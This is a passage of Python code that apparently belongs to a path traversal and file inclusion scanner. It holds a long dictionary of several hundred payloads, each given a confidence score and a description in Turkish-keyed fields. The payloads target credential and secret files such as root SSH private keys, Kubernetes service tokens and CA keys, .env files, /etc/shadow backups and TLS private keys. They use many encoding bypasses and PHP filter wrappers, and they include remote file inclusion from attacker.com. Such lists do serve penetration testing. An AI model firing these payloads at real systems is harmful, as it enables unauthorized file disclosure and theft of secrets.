                {"payload": "..\\..\\..\\WiNdOwS\\sYsTeM32\\dRiVeRs\\EtC\\hOsTs", "guven": 0.72, "aciklama": "Windows alternating case"},

                # 151-160: Bypassing Filters
                {"payload": "....\\\\....\\\\....\\\\etc\\passwd", "guven": 0.78, "aciklama": "Double backslash bypass"},
                {"payload": "..../..../..../etc/passwd", "guven": 0.77, "aciklama": "Quad dot bypass"},
                {"payload": "...\\/...\\/...\\/etc\\/passwd", "guven": 0.76, "aciklama": "Dot slash backslash mix"},
                {"payload": "...//...//.../etc//passwd", "guven": 0.75, "aciklama": "Dot double slash"},
                {"payload": "...\\\\/...\\\\/...\\\\/etc\\\\/passwd", "guven": 0.74, "aciklama": "Complex separator mix"},
                {"payload": "..///..///..///etc//passwd", "guven": 0.73, "aciklama": "Double slash traversal"},
                {"payload": "..\\\\//..\\\\//..\\\\//etc\\\\//passwd", "guven": 0.72, "aciklama": "Mixed separator chaos"},
                {"payload": "...\\.../...\\.../...\\.../etc\\.../passwd", "guven": 0.71, "aciklama": "Dot backslash dot mix"},
                {"payload": "../.\\..\\/..\\../etc/passwd", "guven": 0.70, "aciklama": "Random separator mix"},
                {"payload": ".\\../.\\./.\\../etc/passwd", "guven": 0.69, "aciklama": "Complex dot mix"},

                # 161-170: Length and Overflow Attempts
                {"payload": "../" * 50 + "etc/passwd", "guven": 0.85, "aciklama": "Extreme traversal depth"},
                {"payload": "../" * 100 + "etc/passwd", "guven": 0.84, "aciklama": "Maximum traversal depth"},
                {"payload": "." * 1000 + "/etc/passwd", "guven": 0.65, "aciklama": "Dot overflow attempt"},
                {"payload": "/" * 1000 + "etc/passwd", "guven": 0.64, "aciklama": "Slash overflow attempt"},
                {"payload": ".." + "/" * 500 + "etc/passwd", "guven": 0.63, "aciklama": "Mixed overflow"},
                {"payload": "A" * 1000 + "../../../etc/passwd", "guven": 0.62, "aciklama": "Buffer overflow prefix"},
                {"payload": "../../../etc/passwd" + "A" * 1000, "guven": 0.61, "aciklama": "Buffer overflow suffix"},
                {"payload": "../" * 200 + "etc/passwd" + "B" * 500, "guven": 0.60, "aciklama": "Combined overflow"},
                {"payload": "%2e%2e%2f" * 100 + "etc%2fpasswd", "guven": 0.75, "aciklama": "Encoded overflow"},
                {"payload": "..%c0%af" * 50 + "etc%c0%afpasswd", "guven": 0.74, "aciklama": "Unicode overflow"},

                # 171-180: Time-based and Conditional
                {"payload": "../../../etc/passwd%0a", "guven": 0.73, "aciklama": "Newline injection"},
                {"payload": "../../../etc/passwd%0d", "guven": 0.72, "aciklama": "Carriage return injection"},
                {"payload": "../../../etc/passwd%0d%0a", "guven": 0.71, "aciklama": "CRLF injection"},
                {"payload": "../../../etc/passwd%09", "guven": 0.70, "aciklama": "Tab injection"},
                {"payload": "../../../etc/passwd%20", "guven": 0.69, "aciklama": "Space injection"},
                {"payload": "../../../etc/passwd%0b", "guven": 0.68, "aciklama": "Vertical tab injection"},
                {"payload": "../../../etc/passwd%0c", "guven": 0.67, "aciklama": "Form feed injection"},
                {"payload": "../../../etc/passwd%85", "guven": 0.66, "aciklama": "Next line injection"},
                {"payload": "../../../etc/passwd%a0", "guven": 0.65, "aciklama": "Non-breaking space"},
                {"payload": "../../../etc/passwd%e2%80%8b", "guven": 0.64, "aciklama": "Zero-width space"},

                # 181-190: Multi-byte and Unicode
                {"payload": "..%c0%ae%c0%ae%c0%aeetc%c0%aepasswd", "guven": 0.76, "aciklama": "Multi-byte dot encoding"},
                {"payload": "..%e0%80%ae%e0%80%ae%e0%80%aeetc%e0%80%aepasswd", "guven": 0.75, "aciklama": "UTF-8 overlong dot"},
                {"payload": "..%f0%80%80%ae%f0%80%80%ae%f0%80%80%aeetc%f0%80%80%aepasswd", "guven": 0.74, "aciklama": "4-byte overlong"},
                {"payload": "..\u002e\u002e/\u002e\u002e/\u002e\u002e/etc/passwd", "guven": 0.73, "aciklama": "Unicode dot mix"},
                {"payload": "..\uff0e\uff0e\uff0f..\uff0e\uff0e\uff0f..\uff0e\uff0e\uff0fetc\uff0fpasswd", "guven": 0.72, "aciklama": "Fullwidth characters"},
                {"payload": "..\u2024\u2024\u2044..\u2024\u2024\u2044etc\u2044passwd", "guven": 0.71, "aciklama": "Alternative dot/slash"},
                {"payload": "..%ef%bc%8e%ef%bc%8e%ef%bc%8f..%ef%bc%8e%ef%bc%8e%ef%bc%8fetc%ef%bc%8fpasswd", "guven": 0.70, "aciklama": "UTF-8 fullwidth"},
                {"payload": "..\u0002e\u0002e\u0002f..\u0002e\u0002e\u0002fetc\u0002fpasswd", "guven": 0.69, "aciklama": "Control character mix"},
                {"payload": "..%c1%8a%c1%8a%c1%9c..%c1%8a%c1%8a%c1%9cetc%c1%9cpasswd", "guven": 0.68, "aciklama": "Invalid UTF-8 sequence"},
                {"payload": "..\u200b.\u200b.\u200b/etc/passwd", "guven": 0.67, "aciklama": "Zero-width space mix"},

                # 191-200: Container and Docker Specific
                {"payload": "../../../proc/1/environ", "guven": 0.88, "aciklama": "Init process environment"},
                {"payload": "../../../proc/1/cmdline", "guven": 0.87, "aciklama": "Init process command"},
                {"payload": "../../../proc/1/cgroup", "guven": 0.86, "aciklama": "Init process cgroup"},
                {"payload": "../../../proc/self/cgroup", "guven": 0.85, "aciklama": "Current process cgroup"},
                {"payload": "../../../sys/fs/cgroup/memory/memory.limit_in_bytes", "guven": 0.84, "aciklama": "Container memory limit"},
                {"payload": "../../../sys/fs/cgroup/cpuset/cpuset.cpus", "guven": 0.83, "aciklama": "Container CPU assignment"},
                {"payload": "../../../var/lib/docker/containers/*/config.v2.json", "guven": 0.82, "aciklama": "Docker container config"},
                {"payload": "../../../var/run/docker.sock", "guven": 0.81, "aciklama": "Docker socket"},
                {"payload": "../../../etc/docker/daemon.json", "guven": 0.80, "aciklama": "Docker daemon config"},

                # 201-210: Kubernetes Secrets
                {"payload": "../../../var/run/secrets/kubernetes.io/serviceaccount/namespace", "guven": 0.89, "aciklama": "Kubernetes namespace"},
                {"payload": "../../../run/secrets/kubernetes.io/serviceaccount/token", "guven": 0.88, "aciklama": "Kubernetes service token"},
                {"payload": "../../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "guven": 0.87, "aciklama": "Kubernetes CA certificate"},
                {"payload": "../../../etc/kubernetes/admin.conf", "guven": 0.86, "aciklama": "Kubernetes admin config"},
                {"payload": "../../../etc/kubernetes/kubelet/config.yaml", "guven": 0.85, "aciklama": "Kubelet configuration"},
                {"payload": "../../../var/lib/kubelet/config.yaml", "guven": 0.84, "aciklama": "Kubelet lib config"},
                {"payload": "../../../etc/kubernetes/manifests/kube-apiserver.yaml", "guven": 0.83, "aciklama": "API server manifest"},
                {"payload": "../../../etc/kubernetes/pki/ca.crt", "guven": 0.82, "aciklama": "Kubernetes CA cert"},
                {"payload": "../../../etc/kubernetes/pki/ca.key", "guven": 0.81, "aciklama": "Kubernetes CA key"},
                {"payload": "../../../home/kubernetes/.kube/config", "guven": 0.80, "aciklama": "User kubectl config"},

                # 211-220: Environment Files
                {"payload": "../../../.env", "guven": 0.90, "aciklama": "Environment variables file"},
                {"payload": "../../../.env.local", "guven": 0.89, "aciklama": "Local environment file"},
                {"payload": "../../../.env.production", "guven": 0.88, "aciklama": "Production environment"},
                {"payload": "../../../.env.development", "guven": 0.87, "aciklama": "Development environment"},
                {"payload": "../../../config/.env", "guven": 0.86, "aciklama": "Config directory env"},
                {"payload": "../../../app/.env", "guven": 0.85, "aciklama": "Application env file"},
                {"payload": "../../../src/.env", "guven": 0.84, "aciklama": "Source directory env"},
                {"payload": "../../../.environment", "guven": 0.83, "aciklama": "Alternative env file"},
                {"payload": "../../../.config", "guven": 0.82, "aciklama": "Generic config file"},
                {"payload": "../../../.secrets", "guven": 0.81, "aciklama": "Secrets file"},

                # 221-230: Database Configuration Files
                {"payload": "../../../etc/mysql/mysql.conf.d/mysqld.cnf", "guven": 0.87, "aciklama": "MySQL daemon config"},
                {"payload": "../../../etc/postgresql/*/main/postgresql.conf", "guven": 0.86, "aciklama": "PostgreSQL config"},
                {"payload": "../../../etc/postgresql/*/main/pg_hba.conf", "guven": 0.85, "aciklama": "PostgreSQL host auth"},
                {"payload": "../../../var/lib/mysql/mysql/user.MYD", "guven": 0.84, "aciklama": "MySQL user data"},
                {"payload": "../../../var/lib/postgresql/data/postgresql.conf", "guven": 0.83, "aciklama": "PostgreSQL data config"},
                {"payload": "../../../opt/lampp/etc/my.cnf", "guven": 0.82, "aciklama": "XAMPP MySQL config"},
                {"payload": "../../../etc/mongod.conf", "guven": 0.81, "aciklama": "MongoDB daemon config"},
                {"payload": "../../../etc/cassandra/cassandra.yaml", "guven": 0.80, "aciklama": "Cassandra config"},
                {"payload": "../../../etc/couchdb/local.ini", "guven": 0.79, "aciklama": "CouchDB config"},
                {"payload": "../../../etc/influxdb/influxdb.conf", "guven": 0.78, "aciklama": "InfluxDB config"},

                # 231-240: Web Server Configurations
                {"payload": "../../../etc/apache2/sites-available/000-default.conf", "guven": 0.86, "aciklama": "Apache default site"},
                {"payload": "../../../etc/apache2/sites-enabled/000-default.conf", "guven": 0.85, "aciklama": "Apache enabled site"},
                {"payload": "../../../etc/nginx/sites-available/default", "guven": 0.84, "aciklama": "Nginx default site"},
                {"payload": "../../../etc/nginx/sites-enabled/default", "guven": 0.83, "aciklama": "Nginx enabled site"},
                {"payload": "../../../etc/apache2/httpd.conf", "guven": 0.82, "aciklama": "Apache HTTP config"},
                {"payload": "../../../etc/httpd/conf/httpd.conf", "guven": 0.81, "aciklama": "HTTPD main config"},
                {"payload": "../../../usr/local/apache2/conf/httpd.conf", "guven": 0.80, "aciklama": "Local Apache config"},
                {"payload": "../../../opt/nginx/conf/nginx.conf", "guven": 0.79, "aciklama": "Optional Nginx config"},
                {"payload": "../../../etc/lighttpd/lighttpd.conf", "guven": 0.78, "aciklama": "Lighttpd config"},
                {"payload": "../../../etc/caddy/Caddyfile", "guven": 0.77, "aciklama": "Caddy server config"},

                # 241-250: SSL/TLS Certificates
                {"payload": "../../../etc/ssl/certs/ca-certificates.crt", "guven": 0.85, "aciklama": "CA certificates bundle"},
                {"payload": "../../../etc/ssl/private/ssl-cert-snakeoil.key", "guven": 0.84, "aciklama": "Default SSL private key"},
                {"payload": "../../../etc/ssl/certs/ssl-cert-snakeoil.pem", "guven": 0.83, "aciklama": "Default SSL certificate"},
                {"payload": "../../../etc/letsencrypt/live/*/privkey.pem", "guven": 0.89, "aciklama": "Let's Encrypt private key"},
                {"payload": "../../../etc/letsencrypt/live/*/fullchain.pem", "guven": 0.88, "aciklama": "Let's Encrypt full chain"},
                {"payload": "../../../etc/letsencrypt/live/*/cert.pem", "guven": 0.87, "aciklama": "Let's Encrypt certificate"},
                {"payload": "../../../etc/pki/tls/private/localhost.key", "guven": 0.82, "aciklama": "Local host private key"},
                {"payload": "../../../etc/pki/tls/certs/localhost.crt", "guven": 0.81, "aciklama": "Local host certificate"},
                {"payload": "../../../var/ssl/private/server.key", "guven": 0.80, "aciklama": "Server private key"},
                {"payload": "../../../var/ssl/certs/server.crt", "guven": 0.79, "aciklama": "Server certificate"},

                # 251-260: Application Configuration
                {"payload": "../../../wp-config.php", "guven": 0.92, "aciklama": "WordPress configuration"},
                {"payload": "../../../sites/default/settings.php", "guven": 0.91, "aciklama": "Drupal settings"},
                {"payload": "../../../application/config/database.php", "guven": 0.90, "aciklama": "CodeIgniter database"},
                {"payload": "../../../config/database.php", "guven": 0.89, "aciklama": "Laravel database config"},
                {"payload": "../../../app/config/parameters.yml", "guven": 0.88, "aciklama": "Symfony parameters"},
                {"payload": "../../../protected/config/main.php", "guven": 0.87, "aciklama": "Yii framework config"},
                {"payload": "../../../fuel/app/config/db.php", "guven": 0.86, "aciklama": "FuelPHP database"},
                {"payload": "../../../system/config/database.php", "guven": 0.85, "aciklama": "System database config"},
                {"payload": "../../../inc/config.php", "guven": 0.84, "aciklama": "Include config file"},
                {"payload": "../../../includes/config.inc.php", "guven": 0.83, "aciklama": "Includes config"},

                # 261-270: Version Control Files
                {"payload": "../../../.git/config", "guven": 0.88, "aciklama": "Git configuration"},
                {"payload": "../../../.git/HEAD", "guven": 0.87, "aciklama": "Git HEAD reference"},
                {"payload": "../../../.git/logs/HEAD", "guven": 0.86, "aciklama": "Git HEAD log"},
                {"payload": "../../../.git/refs/heads/master", "guven": 0.85, "aciklama": "Git master branch"},
                {"payload": "../../../.git/refs/heads/main", "guven": 0.84, "aciklama": "Git main branch"},
                {"payload": "../../../.svn/entries", "guven": 0.83, "aciklama": "SVN entries file"},
                {"payload": "../../../.svn/wc.db", "guven": 0.82, "aciklama": "SVN working copy db"},
                {"payload": "../../../.hg/hgrc", "guven": 0.81, "aciklama": "Mercurial config"},
                {"payload": "../../../.bzr/branch/branch.conf", "guven": 0.80, "aciklama": "Bazaar branch config"},
                {"payload": "../../../CVS/Entries", "guven": 0.79, "aciklama": "CVS entries file"},

                # 271-280: Backup Files
                {"payload": "../../../etc/passwd.bak", "guven": 0.85, "aciklama": "Password backup file"},
                {"payload": "../../../etc/shadow.bak", "guven": 0.84, "aciklama": "Shadow backup file"},
                {"payload": "../../../etc/passwd~", "guven": 0.83, "aciklama": "Password temp backup"},
                {"payload": "../../../etc/passwd.old", "guven": 0.82, "aciklama": "Old password file"},
                {"payload": "../../../etc/passwd.orig", "guven": 0.81, "aciklama": "Original password file"},
                {"payload": "../../../etc/passwd.backup", "guven": 0.80, "aciklama": "Backup password file"},
                {"payload": "../../../etc/shadow.old", "guven": 0.79, "aciklama": "Old shadow file"},
                {"payload": "../../../etc/group.bak", "guven": 0.78, "aciklama": "Group backup file"},
                {"payload": "../../../etc/hosts.bak", "guven": 0.77, "aciklama": "Hosts backup file"},
                {"payload": "../../../etc/fstab.bak", "guven": 0.76, "aciklama": "Fstab backup file"},

                # 281-290: User Directories
                {"payload": "../../../home/*/.bash_history", "guven": 0.87, "aciklama": "User bash history"},
                {"payload": "../../../home/*/  .ssh/id_rsa", "guven": 0.92, "aciklama": "User SSH private key"},
                {"payload": "../../../home/*/.ssh/id_rsa.pub", "guven": 0.86, "aciklama": "User SSH public key"},
                {"payload": "../../../home/*/.ssh/authorized_keys", "guven": 0.91, "aciklama": "SSH authorized keys"},
                {"payload": "../../../home/*/.ssh/known_hosts", "guven": 0.85, "aciklama": "SSH known hosts"},
                {"payload": "../../../root/.bash_history", "guven": 0.90, "aciklama": "Root bash history"},
                {"payload": "../../../root/.ssh/id_rsa", "guven": 0.95, "aciklama": "Root SSH private key"},
                {"payload": "../../../root/.ssh/authorized_keys", "guven": 0.94, "aciklama": "Root authorized keys"},
                {"payload": "../../../home/*/.bashrc", "guven": 0.84, "aciklama": "User bash config"},
                {"payload": "../../../home/*/.profile", "guven": 0.83, "aciklama": "User profile"},

                # 291-300: Network Configuration
                {"payload": "../../../etc/network/interfaces", "guven": 0.85, "aciklama": "Network interfaces"},
                {"payload": "../../../etc/hosts", "guven": 0.90, "aciklama": "System hosts file"},
                {"payload": "../../../etc/hostname", "guven": 0.84, "aciklama": "System hostname"},
                {"payload": "../../../etc/resolv.conf", "guven": 0.88, "aciklama": "DNS resolver config"},
                {"payload": "../../../etc/networks", "guven": 0.83, "aciklama": "Network names"},
                {"payload": "../../../etc/protocols", "guven": 0.82, "aciklama": "Network protocols"},
                {"payload": "../../../etc/services", "guven": 0.86, "aciklama": "Network services"},
                {"payload": "../../../etc/netconfig", "guven": 0.81, "aciklama": "Network configuration"},
                {"payload": "../../../etc/systemd/network/*.network", "guven": 0.80, "aciklama": "Systemd network config"},
                {"payload": "../../../etc/NetworkManager/NetworkManager.conf", "guven": 0.79, "aciklama": "NetworkManager config"},

                # 301-310: System Information
                {"payload": "../../../etc/issue", "guven": 0.84, "aciklama": "System issue file"},
                {"payload": "../../../etc/issue.net", "guven": 0.83, "aciklama": "Network issue file"},
                {"payload": "../../../etc/motd", "guven": 0.82, "aciklama": "Message of the day"},
                {"payload": "../../../etc/lsb-release", "guven": 0.85, "aciklama": "LSB release info"},
                {"payload": "../../../etc/os-release", "guven": 0.86, "aciklama": "OS release info"},
                {"payload": "../../../etc/redhat-release", "guven": 0.81, "aciklama": "RedHat release info"},
                {"payload": "../../../etc/debian_version", "guven": 0.80, "aciklama": "Debian version"},
                {"payload": "../../../etc/centos-release", "guven": 0.79, "aciklama": "CentOS release info"},
                {"payload": "../../../etc/fedora-release", "guven": 0.78, "aciklama": "Fedora release info"},
                {"payload": "../../../etc/system-release", "guven": 0.77, "aciklama": "Generic system release"},

                # 311-320: Memory and Process Information
                {"payload": "../../../proc/meminfo", "guven": 0.85, "aciklama": "Memory information"},
                {"payload": "../../../proc/cpuinfo", "guven": 0.84, "aciklama": "CPU information"},
                {"payload": "../../../proc/loadavg", "guven": 0.83, "aciklama": "System load average"},
                {"payload": "../../../proc/uptime", "guven": 0.82, "aciklama": "System uptime"},
                {"payload": "../../../proc/stat", "guven": 0.81, "aciklama": "System statistics"},
                {"payload": "../../../proc/devices", "guven": 0.80, "aciklama": "Device information"},
                {"payload": "../../../proc/filesystems", "guven": 0.79, "aciklama": "Supported filesystems"},
                {"payload": "../../../proc/modules", "guven": 0.78, "aciklama": "Loaded kernel modules"},
                {"payload": "../../../proc/mounts", "guven": 0.77, "aciklama": "Mounted filesystems"},
                {"payload": "../../../proc/partitions", "guven": 0.76, "aciklama": "Disk partitions"},

                # 321-330: Advanced PHP Filters
                {"payload": "php://filter/read=convert.base64-encode|convert.base64-decode/resource=../../../etc/passwd", "guven": 0.88, "aciklama": "Chained PHP filters"},
                {"payload": "php://filter/zlib.deflate|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.87, "aciklama": "Compressed PHP filter"},
                {"payload": "php://filter/convert.iconv.utf-8.utf-16le|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.86, "aciklama": "Iconv UTF-16LE filter"},
                {"payload": "php://filter/convert.iconv.utf-8.utf-32be|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.85, "aciklama": "Iconv UTF-32BE filter"},
                {"payload": "php://filter/string.rot13|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.84, "aciklama": "ROT13 + base64 filter"},
                {"payload": "php://filter/read=convert.quoted-printable-encode|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.83, "aciklama": "Quoted printable + base64"},
                {"payload": "php://filter/bzip2.compress|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.82, "aciklama": "Bzip2 + base64 filter"},
                {"payload": "php://filter/convert.iconv.utf-8.cp037|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.81, "aciklama": "EBCDIC conversion filter"},
                {"payload": "php://filter/string.strip_tags|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.80, "aciklama": "Strip tags + base64"},
                {"payload": "php://filter/convert.iconv.iso-8859-1.utf-8|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.79, "aciklama": "ISO-8859-1 conversion"},

                # 331-340: Data Streams
                {"payload": "data:;base64,Li4vLi4vLi4vZXRjL3Bhc3N3ZA==", "guven": 0.86, "aciklama": "Data stream base64"},
                {"payload": "data:text/plain;charset=utf-8,../../../etc/passwd", "guven": 0.85, "aciklama": "Data stream UTF-8"},
                {"payload": "data:application/octet-stream;base64,Li4vLi4vLi4vZXRjL3Bhc3N3ZA==", "guven": 0.84, "aciklama": "Binary data stream"},
                {"payload": "data:text/html,<script>alert(1)</script>", "guven": 0.70, "aciklama": "HTML data injection"},
                {"payload": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "guven": 0.65, "aciklama": "GIF data payload"},
                {"payload": "zip://path/to/file.zip#dir/file.txt", "guven": 0.83, "aciklama": "ZIP stream wrapper"},
                {"payload": "compress.zlib://path/to/file.gz", "guven": 0.82, "aciklama": "Zlib compression stream"},
                {"payload": "compress.bzip2://path/to/file.bz2", "guven": 0.81, "aciklama": "Bzip2 compression stream"},
                {"payload": "phar://path/to/file.phar/internal/file.txt", "guven": 0.80, "aciklama": "PHAR archive stream"},
                {"payload": "rar://path/to/file.rar#dir/file.txt", "guven": 0.79, "aciklama": "RAR archive stream"},

                # 341-350: File Upload Bypass
                {"payload": "../../../var/www/html/uploads/shell.php", "guven": 0.89, "aciklama": "Web upload directory"},
                {"payload": "../../../tmp/phpYh4f5R", "guven": 0.75, "aciklama": "PHP temp upload"},
                {"payload": "../../../var/tmp/sess_" + "A" * 26, "guven": 0.74, "aciklama": "Session file pattern"},
                {"payload": "../../../uploads/../../../etc/passwd", "guven": 0.87, "aciklama": "Upload directory traversal"},
                {"payload": "../../../files/../../../etc/passwd", "guven": 0.86, "aciklama": "Files directory traversal"},
                {"payload": "../../../media/../../../etc/passwd", "guven": 0.85, "aciklama": "Media directory traversal"},
                {"payload": "../../../assets/../../../etc/passwd", "guven": 0.84, "aciklama": "Assets directory traversal"},
                {"payload": "../../../images/../../../etc/passwd", "guven": 0.83, "aciklama": "Images directory traversal"},
                {"payload": "../../../documents/../../../etc/passwd", "guven": 0.82, "aciklama": "Documents directory traversal"},
                {"payload": "../../../download/../../../etc/passwd", "guven": 0.81, "aciklama": "Download directory traversal"},

                # 351-360: Remote File Inclusion Attempts
                {"payload": "http://attacker.com/shell.txt", "guven": 0.85, "aciklama": "Remote HTTP inclusion"},
                {"payload": "https://attacker.com/shell.txt", "guven": 0.84, "aciklama": "Remote HTTPS inclusion"},
                {"payload": "ftp://attacker.com/shell.txt", "guven": 0.83, "aciklama": "Remote FTP inclusion"},
                {"payload": "ftps://attacker.com/shell.txt", "guven": 0.82, "aciklama": "Secure FTP inclusion"},
                {"payload": "//attacker.com/shell.txt", "guven": 0.81, "aciklama": "Protocol relative URL"},
                {"payload": "http://127.0.0.1:8080/shell.txt", "guven": 0.80, "aciklama": "Local HTTP service"},
                {"payload": "http://localhost/shell.txt", "guven": 0.79, "aciklama": "Localhost inclusion"},
                {"payload": "http://[::1]/shell.txt", "guven": 0.78, "aciklama": "IPv6 localhost"},
                {"payload": "http://0x7f.0x0.0x0.0x1/shell.txt", "guven": 0.77, "aciklama": "Hex IP notation"},
                {"payload": "http://2130706433/shell.txt", "guven": 0.76, "aciklama": "Decimal IP notation"},

                # 361-370: Complex Encoding Chains
                {"payload": "..%25%32%65%25%32%65%25%32%66..%25%32%65%25%32%65%25%32%66etc%25%32%66passwd", "guven": 0.75, "aciklama": "Triple URL encoding"},
                {"payload": "..%2525%32%65%2525%32%65%2525%32%66etc%2525%32%66passwd", "guven": 0.74, "aciklama": "Mixed encoding levels"},
                {"payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "guven": 0.78, "aciklama": "Double percent encoding"},
                {"payload": "%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc%25%32%66passwd", "guven": 0.73, "aciklama": "Nested percent encoding"},
                {"payload": "..\\u%32%65\\u%32%65\\u%32%66etc\\u%32%66passwd", "guven": 0.72, "aciklama": "Unicode + percent mix"},
                {"payload": "..&#%78%32%65;&#%78%32%65;&#%78%32%66;etc&#%78%32%66;passwd", "guven": 0.71, "aciklama": "HTML entity + hex"},
                {"payload": "..\\x%32%65\\x%32%65\\x%32%66etc\\x%32%66passwd", "guven": 0.70, "aciklama": "Hex escape + percent"},
                {"payload": "..%u%30%30%32%65%u%30%30%32%65%u%30%30%32%66etc%u%30%30%32%66passwd", "guven": 0.69, "aciklama": "Unicode + percent mix"},
                {"payload": "..\\%32\\%65\\%32\\%65\\%32\\%66etc\\%32\\%66passwd", "guven": 0.68, "aciklama": "Backslash + percent"},
                {"payload": "..%c%30%25%32%65%c%30%25%32%65%c%30%25%32%66etc%c%30%25%32%66passwd", "guven": 0.67, "aciklama": "Complex encoding chain"},

                # 371-380: Windows Advanced Paths
                {"payload": "..\\..\\..\\windows\\system32\\config\\security", "guven": 0.93, "aciklama": "Windows security registry"},
                {"payload": "..\\..\\..\\windows\\system32\\config\\default", "guven": 0.92, "aciklama": "Windows default registry"},
                {"payload": "..\\..\\..\\windows\\system32\\eula.txt", "guven": 0.85, "aciklama": "Windows EULA text"},
                {"payload": "..\\..\\..\\windows\\WindowsUpdate.log", "guven": 0.84, "aciklama": "Windows Update log"},
                {"payload": "..\\..\\..\\windows\\SchedLgU.Txt", "guven": 0.83, "aciklama": "Scheduled tasks log"},
                {"payload": "..\\..\\..\\windows\\system32\\LogFiles\\Sum\\Api.log", "guven": 0.82, "aciklama": "Windows API log"},
                {"payload": "..\\..\\..\\windows\\system32\\LogFiles\\Sum\\SystemIdentity.bak", "guven": 0.81, "aciklama": "System identity backup"},
                {"payload": "..\\..\\..\\windows\\system32\\wbem\\Logs\\wmiprov.log", "guven": 0.80, "aciklama": "WMI provider log"},
                {"payload": "..\\..\\..\\windows\\Panther\\setupact.log", "guven": 0.79, "aciklama": "Windows setup log"},
                {"payload": "..\\..\\..\\windows\\inf\\setupapi.dev.log", "guven": 0.78, "aciklama": "Setup API device log"},

                # 381-390: Application Log Files
                {"payload": "../../../var/log/dpkg.log", "guven": 0.82, "aciklama": "Debian package log"},
                {"payload": "../../../var/log/yum.log", "guven": 0.81, "aciklama": "YUM package log"},
                {"payload": "../../../var/log/apt/history.log", "guven": 0.80, "aciklama": "APT history log"},
                {"payload": "../../../var/log/lastlog", "guven": 0.85, "aciklama": "Last login log"},
                {"payload": "../../../var/log/wtmp", "guven": 0.84, "aciklama": "Login records"},
                {"payload": "../../../var/log/btmp", "guven": 0.83, "aciklama": "Bad login attempts"},
                {"payload": "../../../var/log/utmp", "guven": 0.79, "aciklama": "Current login sessions"},
                {"payload": "../../../var/log/faillog", "guven": 0.78, "aciklama": "Failed login log"},
                {"payload": "../../../var/log/secure", "guven": 0.86, "aciklama": "Security log (RedHat)"},
                {"payload": "../../../var/log/audit/audit.log", "guven": 0.87, "aciklama": "System audit log"},

                # 391-400: Service Configuration Files
                {"payload": "../../../etc/xinetd.conf", "guven": 0.78, "aciklama": "Xinetd configuration"},
                {"payload": "../../../etc/inetd.conf", "guven": 0.77, "aciklama": "Inetd configuration"},
                {"payload": "../../../etc/sudoers", "guven": 0.92, "aciklama": "Sudo configuration"},
                {"payload": "../../../etc/cron.allow", "guven": 0.80, "aciklama": "Cron allow list"},
                {"payload": "../../../etc/cron.deny", "guven": 0.79, "aciklama": "Cron deny list"},
                {"payload": "../../../etc/at.allow", "guven": 0.76, "aciklama": "At allow list"},
                {"payload": "../../../etc/at.deny", "guven": 0.75, "aciklama": "At deny list"},
                {"payload": "../../../etc/login.defs", "guven": 0.81, "aciklama": "Login definitions"},
                {"payload": "../../../etc/security/limits.conf", "guven": 0.82, "aciklama": "Resource limits"},

                # 401-410: Monitoring and Performance
                {"payload": "../../../var/log/munin/munin-node.log", "guven": 0.76, "aciklama": "Munin monitoring log"},
                {"payload": "../../../var/log/nagios/nagios.log", "guven": 0.77, "aciklama": "Nagios monitoring log"},
                {"payload": "../../../var/log/zabbix/zabbix_agentd.log", "guven": 0.78, "aciklama": "Zabbix agent log"},
                {"payload": "../../../etc/snmp/snmpd.conf", "guven": 0.79, "aciklama": "SNMP daemon config"},
                {"payload": "../../../var/log/snmpd.log", "guven": 0.75, "aciklama": "SNMP daemon log"},
                {"payload": "../../../etc/collectd/collectd.conf", "guven": 0.74, "aciklama": "Collectd config"},
                {"payload": "../../../var/log/collectd.log", "guven": 0.73, "aciklama": "Collectd log"},
                {"payload": "../../../etc/prometheus/prometheus.yml", "guven": 0.80, "aciklama": "Prometheus config"},
                {"payload": "../../../var/log/grafana/grafana.log", "guven": 0.78, "aciklama": "Grafana log"},
                {"payload": "../../../etc/telegraf/telegraf.conf", "guven": 0.77, "aciklama": "Telegraf config"},

                # 411-420: Virtualization Configs
                {"payload": "../../../etc/libvirt/libvirtd.conf", "guven": 0.79, "aciklama": "Libvirt daemon config"},
                {"payload": "../../../etc/xen/xl.conf", "guven": 0.78, "aciklama": "Xen hypervisor config"},
                {"payload": "../../../etc/vmware/config", "guven": 0.77, "aciklama": "VMware configuration"},
                {"payload": "../../../var/log/libvirt/libvirtd.log", "guven": 0.76, "aciklama": "Libvirt daemon log"},
                {"payload": "../../../var/log/xen/hypervisor.log", "guven": 0.75, "aciklama": "Xen hypervisor log"},
                {"payload": "../../../etc/qemu/bridge.conf", "guven": 0.74, "aciklama": "QEMU bridge config"},
                {"payload": "../../../var/log/qemu/qemu.log", "guven": 0.73, "aciklama": "QEMU log"},
                {"payload": "../../../etc/vbox/vbox.cfg", "guven": 0.72, "aciklama": "VirtualBox config"},
                {"payload": "../../../var/log/vbox.log", "guven": 0.71, "aciklama": "VirtualBox log"},
                {"payload": "../../../etc/kvm/kvm.conf", "guven": 0.70, "aciklama": "KVM configuration"},

                # 421-430: Mail Server Configs
                {"payload": "../../../etc/postfix/master.cf", "guven": 0.84, "aciklama": "Postfix master config"},
                {"payload": "../../../etc/postfix/transport", "guven": 0.83, "aciklama": "Postfix transport map"},
                {"payload": "../../../etc/dovecot/dovecot.conf", "guven": 0.82, "aciklama": "Dovecot IMAP config"},
                {"payload": "../../../etc/exim/exim.conf", "guven": 0.81, "aciklama": "Exim MTA config"},
                {"payload": "../../../etc/sendmail/sendmail.cf", "guven": 0.80, "aciklama": "Sendmail config"},
                {"payload": "../../../var/log/mail.err", "guven": 0.78, "aciklama": "Mail error log"},
                {"payload": "../../../var/log/mail.warn", "guven": 0.77, "aciklama": "Mail warning log"},
                {"payload": "../../../var/log/mail.info", "guven": 0.76, "aciklama": "Mail info log"},
                {"payload": "../../../var/spool/mail/root", "guven": 0.85, "aciklama": "Root mailbox"},
                {"payload": "../../../var/mail/root", "guven": 0.84, "aciklama": "Root mail alternative"},

                # 431-440: FTP Server Configs
